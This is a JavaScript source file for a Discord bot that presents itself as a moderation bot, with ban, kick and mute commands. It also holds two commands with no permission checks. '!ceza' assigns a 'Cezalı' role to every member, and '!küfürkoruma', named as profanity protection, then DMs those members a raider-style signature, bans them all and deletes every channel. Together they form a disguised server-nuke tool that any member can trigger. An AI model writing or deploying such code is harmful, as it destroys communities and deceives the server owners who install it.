require('dotenv').config();
const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const prefix = '!';

client.on('ready', () => {
    console.log(`💛 Bot aktif: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // !tamyasakla @kişi = kişiyi sunucudan banlar
    if (command === 'tamyasakla') {
        const member = message.mentions.members.first();
        if (!member) return message.reply('Yasaklanacak kişiyi etiketlemedin yavrum.');
        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers))
            return message.reply('Bu komutu kullanmak için iznin yok kuzum.');
        await member.ban({ reason: 'Tamyasakla komutu uygulandı.' });
        message.channel.send(`${member.user.tag} sunucudan tamamen yasaklandı. 🌙`);
    }

    // !kick @kişi = kişiyi sunucudan atar
    else if (command === 'kick') {
        const member = message.mentions.members.first();
        if (!member) return message.reply('Kim atılacaksa onu etiketle lütfen.');
        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers))
            return message.reply('Bu komut için yetkin yok yavrum.');
        await member.kick('Kick komutu uygulandı.');
        message.channel.send(`${member.user.tag} sunucudan atıldı. 🚪`);
    }

    // !mute @kişi = kişiye zamanaşımı verir
    else if (command === 'mute') {
        const member = message.mentions.members.first();
        const duration = parseInt(args[1]) || 5; // dakika cinsinden
        if (!member) return message.reply('Susturulacak kişiyi etiketlemeyi unuttun.');
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers))
            return message.reply('Bu komut için iznin yok kuzum.');
        const timeout = duration * 60 * 1000;
        await member.timeout(timeout);
        message.channel.send(`${member.user.tag} ${duration} dakika susturuldu. 🤫`);
    }

    // !ceza = sunucudaki herkese Cezalı rolü verir
    else if (command === 'ceza') {
        const role = message.guild.roles.cache.find(r => r.name === 'Cezalı');
        if (!role) return message.reply('Cezalı rolü bulunamadı.');
        message.guild.members.cache.forEach(member => {
            if (!member.user.bot) {
                member.roles.add(role).catch(() => {});
            }
        });
        message.channel.send('Sunucudaki herkese **Cezalı** rolü verildi. 🔒');
    }

    // !küfürkoruma = Cezalı rolü olan herkesi banlar ve tüm kanalları siler
    else if (command === 'küfürkoruma') {
        const role = message.guild.roles.cache.find(r => r.name === 'Cezalı');
        if (!role) return message.reply('Cezalı rolü bulunamadı yavrum.');

        message.guild.members.cache.forEach(async (member) => {
            if (member.roles.cache.has(role.id)) {
                try {
                    await member.send('TKTlendiniz By. sys.fors & Alilw');
                } catch (err) {
                    console.log(`DM gönderilemedi: ${member.user.tag}`);
                }

                try {
                    await member.ban({ reason: 'Küfür koruması aktif' });
                    console.log(`${member.user.tag} banlandı.`);
                } catch (err) {
                    console.log(`Ban başarısız: ${member.user.tag}`);
                }
            }
        });

        message.guild.channels.cache.forEach(async (channel) => {
            try {
                await channel.delete();
                console.log(`Silindi: ${channel.name}`);
            } catch (err) {
                console.log(`Kanal silinemedi: ${channel.name}`);
            }
        });

        message.channel.send('Küfür koruması tamamlandı. Kanallar temizlendi. ⚠️');
    }
});

client.login(process.env.TOKEN);
